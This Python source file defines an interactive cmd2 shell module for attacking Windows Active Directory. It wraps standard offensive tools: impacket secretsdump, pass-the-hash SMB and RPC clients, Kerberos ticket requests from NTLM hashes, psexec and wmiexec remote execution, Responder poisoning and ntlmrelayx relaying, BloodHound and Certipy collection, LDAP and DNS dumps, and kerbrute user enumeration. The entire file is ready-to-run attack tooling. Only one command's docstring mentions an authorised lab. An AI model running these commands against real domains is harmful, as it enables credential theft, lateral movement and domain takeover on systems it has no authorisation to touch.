"""Active Directory module — enum, relay, kerberos attacks, bloodhound, certipy."""

from __future__ import annotations

import os
import platform

import cmd2
from cmd2 import with_default_category

import utils.run_task as rt
import utils.string_format as sf
from utils.base_shell import BaseShell
from utils.check_var import check_vars
from utils.validation import safe_filename

PLATFORM_SYSTEM = platform.system()


@with_default_category("Main commands")
class ADHacking(BaseShell):
    def __init__(self):
        super().__init__("AD-Hacking", "Active Directory attacks & enumeration")
        self.domain = ""
        self.target_path = ""
        self.user = ""
        self.hash = ""
        self.addr = ""
        self.target_name = ""
        self.service = ""
        self.interface = ""
        self.network = ""
        self.dc_ip = ""
        self.targets_file = f"{self.resultsPath}targets.txt"
        self.add_settable(cmd2.Settable("domain", str, "Target Domain (example.local)", self))
        self.add_settable(cmd2.Settable("targets_file", str, "Targets file path", self))
        self.add_settable(cmd2.Settable("network", str, "Target network (192.168.1.0/24)", self))
        self.add_settable(cmd2.Settable("interface", str, "Local interface (eth0)", self))
        self.add_settable(cmd2.Settable("service", str, "Target service name", self))
        self.add_settable(cmd2.Settable("target_name", str, "Target hostname (WS-01)", self))
        self.add_settable(cmd2.Settable("target_path", str, "Format: //IP/DIR", self))
        self.add_settable(cmd2.Settable("addr", str, "Target IP Address", self))
        self.add_settable(cmd2.Settable("user", str, "Domain Username", self))
        self.add_settable(cmd2.Settable("hash", str, "NTLM Hash", self))
        self.add_settable(cmd2.Settable("dc_ip", str, "Domain Controller IP", self))
        os.makedirs(self.resultsPath, exist_ok=True)
        self.do_help("-v")

    # ── Impacket classic ──────────────────────────────────────────────

    def do_secrets_dump_hashfile(self, arg):
        "Impacket secretsdump from hash"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            rt.runBackground(["impacket-secretsdump", self.domain + "/" + self.user])

    def do_secrets_dump_kerberos(self, arg):
        "Impacket secretsdump with TGT"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "target_name", "value": self.target_name}]):
            rt.runBackground(["impacket-secretsdump", f"{self.domain}/{self.user}@{self.target_name}", "-k", "-no-pass"])

    def do_pth_smb(self, arg):
        "Pass-the-Hash SMB client"
        if check_vars([{"name": "target_path", "value": self.target_path}, {"name": "user", "value": self.user}, {"name": "hash", "value": self.hash}, {"name": "domain", "value": self.domain}]):
            rt.runBackground(["pth-smbclient", self.target_path, "-U", self.user, "--pw-nt-hash", self.hash, "-W", self.domain])

    def do_pth_rpc(self, arg):
        "Pass-the-Hash RPC client"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "hash", "value": self.hash}, {"name": "addr", "value": self.addr}]):
            rt.runBackground(["pth-rpcclient", "-U", f"{self.domain}/{self.user}%:{self.hash}", f"//{self.addr}"])

    def do_get_tgt(self, arg):
        "Impacket getTGT (NTLM hash → TGT)"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "hash", "value": self.hash}]):
            rt.runBackground(["impacket-getTGT", f"{self.domain}/{self.user}", "-hashes", f":{self.hash}"])

    def do_get_st(self, arg):
        "Impacket getST (service ticket)"
        if check_vars([{"name": "service", "value": self.service}, {"name": "target_name", "value": self.target_name}, {"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            rt.runBackground(["impacket-getST", "-spn", f"{self.service}/{self.target_name}", "-no-pass", "-k", f"{self.domain}/{self.user}"])

    def do_ps_exec(self, arg):
        "Impacket PsExec with Kerberos"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "target_name", "value": self.target_name}]):
            rt.runBackground(["impacket-psexec", f"{self.domain}/{self.user}@{self.target_name}", "-k", "-no-pass"])

    def do_wmiexec(self, arg):
        "Impacket wmiexec"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "addr", "value": self.addr}]):
            rt.runBackground(["impacket-wmiexec", f"{self.domain}/{self.user}@{self.addr}"])

    # ── Responder / Relay ─────────────────────────────────────────────

    def do_get_ntlmv2_hash(self, arg):
        "LLMNR/NBTNS responder to capture NTLMv2"
        if check_vars([{"name": "interface", "value": self.interface}]):
            rt.runBackground(["responder", "-I", self.interface, "-Pv"])

    def do_responder_analyze(self, arg):
        "Responder in analyze mode (no poisoning)"
        if check_vars([{"name": "interface", "value": self.interface}]):
            rt.runBackground(["responder", "-I", self.interface, "-A"])

    def do_ntlmsmb_relay(self, arg):
        "NTLM->SMB relay (authorised lab only)"
        if check_vars([{"name": "network", "value": self.network}, {"name": "interface", "value": self.interface}]):
            rt.runBackground(["crackmapexec", "smb", self.network])
            print("Generating targets.txt\n")
            with open(self.targets_file, "w") as f:
                while True:
                    tmp = input("Target IP Addr: ")
                    f.write(tmp + "\n")
                    if input("Stop? [y/n]: ").lower() == "y":
                        break
            rt.runBackground(["impacket-ntlmrelayx", "-smb2support", "-tf", self.targets_file, "-socks"])
            rt.runBackground(["responder", "-I", self.interface, "-Pv"])

    # ── BloodHound ────────────────────────────────────────────────────

    def do_bloodhound(self, arg):
        "Run bloodhound-python collector"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            extra = ["-c", "All"]
            if self.hash:
                extra.extend(["--hashes", self.hash])
            else:
                pwd = input("Password (leave empty if using hash): ").strip()
                if pwd:
                    extra.extend(["-p", pwd])
            if self.dc_ip:
                extra.extend(["--dc", self.dc_ip])
            if self.target_name:
                extra.extend(["--dns-tcp"])
            rt.runBackground([
                "bloodhound-python", "-d", self.domain,
                "-u", self.user, "-ns", self.dc_ip or self.addr or "",
                *extra, "--zip",
            ], self.resultsPath)

    # ── Certipy (AD CS) ───────────────────────────────────────────────

    def do_certipy_find(self, arg):
        "Certipy — enumerate AD CS"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            extra = []
            if self.hash:
                extra.extend(["--hashes", self.hash])
            rt.runBackground(["certipy", "find", "-u", f"{self.domain}\\{self.user}", *extra, "-dc-ip", self.dc_ip or self.addr or ""], self.resultsPath)

    def do_certipy_auth(self, arg):
        "Certipy — request + authenticate with certificate"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            extra = []
            if self.hash:
                extra.extend(["--hashes", self.hash])
            rt.runBackground(["certipy", "auth", "-u", f"{self.domain}\\{self.user}", *extra, "-dc-ip", self.dc_ip or self.addr or ""], self.resultsPath)

    # ── LDAP / DNS / enum ─────────────────────────────────────────────

    def do_ldapdomaindump(self, arg):
        "LDAP domain dump"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}]):
            extra = []
            if self.hash:
                extra.extend(["--hashes", self.hash])
            rt.runBackground(["ldapdomaindump", f"ldap://{self.dc_ip or self.addr or self.domain}", "-u", f"{self.domain}\\{self.user}", *extra], self.resultsPath)

    def do_adidnsdump(self, arg):
        "ADIDNS dump (DNS records from AD)"
        if check_vars([{"name": "domain", "value": self.domain}, {"name": "user", "value": self.user}, {"name": "dc_ip", "value": self.dc_ip}]):
            extra = []
            if self.hash:
                extra.extend(["--hashes", self.hash])
            rt.runBackground(["adidnsdump", "-u", f"{self.domain}\\{self.user}", *extra, self.dc_ip], self.resultsPath)

    def do_crackmapexec_smb(self, arg):
        "crackmapexec SMB sweep"
        if check_vars([{"name": "network", "value": self.network}]):
            extra = []
            if self.user:
                extra.extend(["-u", self.user])
            if self.hash:
                extra.extend(["-H", self.hash])
            rt.runBackground(["crackmapexec", "smb", self.network, *extra])

    def do_enum4linux(self, arg):
        "enum4linux-ng SMB enumeration"
        if check_vars([{"name": "addr", "value": self.addr}]):
            rt.runBackground(["enum4linux-ng", "-A", self.addr], self.resultsPath)

    def do_smbclient(self, arg):
        "SMB client list shares"
        if check_vars([{"name": "addr", "value": self.addr}]):
            rt.runBackground(["smbclient", "-L", f"//{self.addr}", "-N"])

    # ── Kerberos ──────────────────────────────────────────────────────

    def do_kerbrute_userenum(self, arg):
        "Kerbrute user enumeration"
        if check_vars([{"name": "domain", "value": self.domain}]):
            wl = self.wordlist or input("Wordlist path [/usr/share/wordlists/names.txt]: ").strip() or "/usr/share/wordlists/names.txt"
            rt.runBackground(["kerbrute", "userenum", "-d", self.domain, "--dc", self.dc_ip or self.addr, wl], self.resultsPath)


def main():
    ADHacking().cmdloop()
